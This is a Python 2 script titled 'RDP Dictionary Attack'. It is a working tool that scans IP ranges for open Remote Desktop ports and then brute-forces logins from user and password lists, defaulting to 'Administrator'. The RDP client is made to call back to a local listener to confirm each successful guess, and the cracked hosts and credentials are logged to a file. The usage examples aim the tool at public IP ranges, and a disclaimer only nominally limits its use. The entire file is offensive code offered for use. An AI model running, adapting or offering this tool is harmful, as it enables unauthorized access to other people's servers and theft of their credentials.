#! /usr/bin/env python
# RDP Dictionary Attack
# 21.05.2012 cmiN
#
# THIS SCRIPT IS INTENDED FOR PERSONAL AND LIMITED PURPOSES ONLY
# I AM NOT RESPONSIBLE FOR ANY LEGAL OR ILLEGAL USE OF THIS PROGRAM
#
# Connect with rdesktop, xfreerdp or something similar using
# servers, users and passwords from files.
# After checking if the port is opened, the wrapper opens a shell console
# executing the client with data from input files. In the meantime
# a local socket is accepting connections from the target and if the link
# is established then the user and password for that server are a match.
#
# You need rdesktop/xfreerdp (sudo apt-get/yum/equo install rdesktop/freerdp).
# On gentoo based systems use emerge to find and install the newest packages.
# Contact: cmin764@yahoo/gmail.com


from sys import argv, platform
from threading import Thread, active_count, Lock
from subprocess import Popen
from socket import *


# defaults
THRD = 4 # how many threads for crack phase
TOUT = 6.0 # timeout in seconds
# get global host ip
try:
    sock = socket(AF_INET, SOCK_STREAM)
    sock.connect(("www.google.com", 80)) # assuming google works
except error as excp: # error from socket (timed out or invalid server)
    print "Check your internet connection: %s." % excp
    exit()
else:
    HOST = sock.getsockname()[0]
finally:
    sock.close()
    del sock
PORT = 51337 # used for local listening
# attack modes
RDP1 = ["rdesktop", "-u", "{user}", "-p", "{password}", "-s", "telnet {host} {port}",
        "-g", "1x1", "-a", "8", "-x", "m", "-z", "-m", "{server}"]
RDP2 = ["xfreerdp", "-u", "{user}", "-p", "{password}", "-s", "telnet {host} {port}",
        "-g", "1x1", "-a", "8", "-x", "m", "-z", "--no-motion", "{server}"]
VERB = False # verbose
METH = "r" # RDP1
USER = ["Administrator"]
SAFE = True
SWTC = True
LIMT = None # attacks (test only, None -> unlimited)


class Engine:
    """Main class used to find and crack servers with desired options.
    For more info see usage from the bottom of the script.
    It executes commands through subprocess and waits for replies within timeout.
    """

    def __init__(self, threads, timeout, host, port, rdp1, rdp2, verbose, method, usr, safe, switch):
        """Copy global options and prepare the core."""
        self.cli = True # activate print/stdout (set to False if a GUI is used)
        self.threads = threads
        self.timeout = timeout
        self.host = host
        self.port = port
        self.rdp1 = rdp1
        self.rdp2 = rdp2
        self.verbose = verbose
        self.sockets = dict() # D[x] = True if x is available otherwise False
        self.pos = list() # list with indexes (user, password, server, telnet)
        self.usr = usr
        self.pwd = None
        self.srv = None
        # set the command used for scanning
        if method == "x":
            self.command = self.rdp2
        else:
            self.command = self.rdp1
        # default: don't save
        self.working = None
        self.cracked = None
        self.good = list() # rdp servers
        self.delete = set() # dispose of cracked servers
        self.lock = Lock() # global printing thread synchronization
        self.sock_mutex = Lock() # for localhost socket use
        if "linux" in platform:
            self.null = open("/dev/null", "w")
        else:
            self.null = open("NUL", "w")
        self.safe = safe
        self.switch = switch

    def __del__(self):
        """Destructor."""
        if hasattr(self.srv, "close"):
            self.srv.close()
        if hasattr(self.usr, "close"):
            self.usr.close()
        if self.pwd:
            self.pwd.close()
        if self.working:
            self.working.close()
        if self.cracked:
            self.cracked.close()
        for sock in self.sockets:
            sock.shutdown(SHUT_RDWR)
            sock.close()

    def generator(self, src, dest):
        """Just like grandpa's old mileage meter :]."""
        temp = "%d.%d.%d.%d"
        byte = 256
        yield temp % tuple(src) # yield -> the beauty of python
        while (src != dest):    # like return but continue
            src[3] += 1
            if src[3] == byte:
                src[3] = 0
                src[2] += 1
                if src[2] == byte:
                    src[2] = 0
                    src[1] += 1
                    if src[1] == byte:
                        src[1] = 0
                        src[0] += 1
            yield temp % tuple(src)

    def set_threads(self, threads):
        self.threads = threads

    def set_safe(self, safe):
        self.safe = safe

    def set_switch(self, switch):
        self.switch = switch

    def set_timeout(self, timeout):
        self.timeout = timeout

    def set_verbose(self, verbose):
        self.verbose = verbose

    def set_method(self, method):
        if method == "x":
            self.command = self.rdp2
        else:
            self.command = self.rdp1

    def set_usr(self, usr):
        """If this is called, then the users are taken from a file."""
        self.usr = open(usr, "r") # do not use the generic one

    def set_pwd(self, pwd):
        """The file with passwords is mandatory."""
        self.pwd = open(pwd, "r")

    def set_srv(self, srv):
        """Make a file object or range generator from argument."""
        if srv.find("-") == -1: # not found -> not range
            self.srv = open(srv, "r")
        else:
            chunks = srv.split("-")
            src, dest = chunks[0].split("."), chunks[1].split(".")
            for i in xrange(4):
                src[i] = int(src[i])
                dest[i] = int(dest[i])
            self.srv = self.generator(src, dest)

    def set_working(self, working):
        """Save progress in scan phase."""
        self.working = open(working, "a") # safe append

    def set_cracked(self, cracked):
        """Save progress in crack phase."""
        self.cracked = open(cracked, "a")

    def scan_server(self, server):
        """Check if the rdp port is opened on the specified server."""
        try:
            # create the socket and connect
            sock = socket(AF_INET, SOCK_STREAM)
            sock.connect((server, 3389))
        except error:
            # timed out in most cases
            if self.verbose:
                self.lock.acquire()
                if self.cli:
                    print "[-] %s [NO]" % server # only with -v
                self.lock.release()
        else:
            # good news everyone
            self.lock.acquire()
            if self.cli:
                print "[+] %s [OK]" % server
            self.good.append(server)
            if self.working:
                self.working.write(server + "\n")
                self.working.flush()
            self.lock.release()
        finally:
            sock.close()

    def scan(self):
        """Just like a port scanner for 3389."""
        setdefaulttimeout(self.timeout / 10.0) # 10%
        for server in self.srv:
            while active_count() > self.threads * 16:
                pass # do not exceed number of threads
            if self.switch: # scan them
                # now call the method in a separate thread
                Thread(target=self.scan_server, args=[server.strip()]).start()
            else: # or skip the scan
                self.good.append(server.strip())
        while active_count() > 1:
            pass # join all

    def acquire_sock(self):
        for sock, state in self.sockets.iteritems():
            if state: # available
                self.sockets[sock] = False # use it
                return sock

    def release_sock(self, sock):
        self.sockets[sock] = True

    def crack_server(self, command):
        try:
            # get a server
            self.sock_mutex.acquire()
            sock = self.acquire_sock()
            self.sock_mutex.release()
            command[self.pos[3]] = command[self.pos[3]].format(port=sock.getsockname()[1])
            child = Popen(command, stdout=self.null, stderr=self.null) # no wait
            sock.accept() # here is the big overhead
        except error as excp:
            # timed out
            if self.verbose:
                self.lock.acquire()
                if self.cli:
                    print "[-] %s %s %s [NO]" % (command[self.pos[2]], command[self.pos[0]],
                                                  command[self.pos[1]])
                self.lock.release()
        else:
            # good news again
            show = "%s %s %s" % (command[self.pos[2]], command[self.pos[0]], command[self.pos[1]])
            self.delete.add(command[self.pos[2]]) # cracked! no need to process again
            self.lock.acquire()
            if self.cli:
                print "[+] " + show + " [OK]"
            if self.cracked:
                self.cracked.write(show + "\n")
                self.cracked.flush()
            self.lock.release()
        finally:
            child.kill()
            # do not close it, instead release it for further use
            self.release_sock(sock) # O(1) and can't affect the same socket

    def crack(self):
        """For each user take each password and test them with each working server."""
        goodLen = len(self.good)
        if goodLen == 0:
            if self.cli:
                print "[!] No servers to crack."
            return
        if self.safe: # avoid deadlocks or strange behavior
            self.set_threads(min(self.threads, goodLen))
        users = [line.strip() for line in self.usr]
        passwords = [line.strip() for line in self.pwd]
        if self.cli:
            print "[i] Cracking %d hosts in %fs." % (goodLen, float(len(users)) * len(passwords) *
                                                     goodLen * self.timeout / self.threads)
        setdefaulttimeout(self.timeout) # now use the real timeout
        # prepare the sockets
        for port in xrange(self.threads):
            sock = socket(AF_INET, SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.bind((self.host, self.port + port))
            sock.listen(1)
            self.sockets[sock] = True
        # init command template
        command = self.command
        shellIndex = command.index("telnet {host} {port}")
        command[shellIndex] = command[shellIndex].format(host=self.host, port="{port}")
        self.pos = [command.index("{user}"), command.index("{password}"),
                    command.index("{server}"), shellIndex]
        attacks = 0
        for user in users:
            command[self.pos[0]] = user
            for password in passwords:
                command[self.pos[1]] = password
                for server in self.good:
                    command[self.pos[2]] = server
                    while active_count() > self.threads:
                        pass # do not exceed number of threads
                    attacks += 1
                    if LIMT and attacks > LIMT:
                        if self.cli:
                            print "[!] Limit reached, buy the script."
                        return
                    # now call the method in a separate thread
                    Thread(target=self.crack_server, args=[command[:]]).start()
                for server in self.delete: # N^2 can be reduced to NlogN with set
                    self.good.remove(server) # and also to N with index memorization
                self.delete.clear()
        while active_count() > 1:
            pass # join all


def parse():
    at = 1
    params = list()
    while at < argc:
        if argv[at] in ("-h", "--help"):
            print usage
            exit() # do not start the process
        elif argv[at] in ("-v", "--verbose"):
            app.set_verbose(True)
        elif argv[at] in ("-t", "--threads"):
            at += 1
            app.set_threads(int(argv[at]))
        elif argv[at] in ("-T", "--timeout"):
            at += 1
            app.set_timeout(float(argv[at]))
        elif argv[at] in ("-m", "--method"):
            at += 1
            app.set_method(argv[at])
        elif argv[at] in ("-w", "--working"):
            at += 1
            app.set_working(argv[at])
        elif argv[at] in ("-c", "--cracked"):
            at += 1
            app.set_cracked(argv[at])
        elif argv[at] in ("-s", "--safe-off"):
            app.set_safe(False)
        elif argv[at] in ("-n", "--no-scan"):
            app.set_switch(False)
        else:
            if argv[at][0] == "-":
                raise Exception("Invalid option")
            params.append(argv[at])
        at += 1
    pLen = len(params)
    if pLen not in (2, 3):
        raise Exception("Invalid number of parameters")
    app.set_srv(params[-1])
    app.set_pwd(params[-2])
    if pLen == 3:
        app.set_usr(params[-3]) # same index as 0


def main():
    try:
        if argc == 1:
            # show a message or start the GUI which is missing :)
            print "You should run: %s --help" % argv[0]
            exit()
        # or parse the arguments
        parse()
        # and start the scanner
        print "[i] Scan phase started."
        app.scan() # filter the input for working rdp servers
        print "[i] Crack phase started."
        app.crack() # crack them
    except Exception as excp:
        print "[x] Error: %s." % excp
    except KeyboardInterrupt:
        print "[!] Stopped."
    else:
        print "[i] Finished."


if __name__ == "__main__":
    argc = len(argv)
    usage = """
Usage: {0} [options] [usr] pwd srv

Options:
    -t, --threads <number>     number of threads (parallel connections)
    -s, --safe-off             by default the number of threads is reduced
                               to the number of working servers if it's greater
                               use this option to keep the number of threads
    -T, --timeout <seconds>    waiting response time for each connection
    -m, --method <r/x>         use [r]desktop or [x]freerdp
    -w, --working <file>       file used to store servers with 3389 opened
    -c, --cracked <file>       file used to store cracked servers
    -n, --no-scan              skip scan phase asumming all servers are working rdps
    -v, --verbose              show extra information (default off)
    -h, --help                 show this help

Parameters:
    usr                        users file (default users: {1})
    pwd                        passwords file
    srv                        servers file or range (abc.def.ghi.jkl-mno.pqr.stu.vwx)

Examples:
    {0} -c cracked.txt passwords.txt 68.195.205.60-68.195.211.60
    {0} -w good.txt --timeout 2 -s pass.txt 91.202.91.119-91.202.94.15
    {0} -t 256 -T 5 -v -c cracked.txt -n users.txt pass.txt good.txt

Users, passwords and working servers are loaded into memory.
Be aware to not open a file for both read and write. More exactly do not use
the same file name with `-w`/`-c` and `srv`.

THIS SCRIPT IS INTENDED FOR PERSONAL AND LIMITED PURPOSES ONLY
I AM NOT RESPONSIBLE FOR ANY LEGAL OR ILLEGAL USE OF THIS PROGRAM

Send bugs to cmin764@yahoo/gmail.com.
""".format(argv[0], USER)
    app = Engine(THRD, TOUT, HOST, PORT, RDP1, RDP2, VERB, METH, USER, SAFE, SWTC)
    main()
    del app
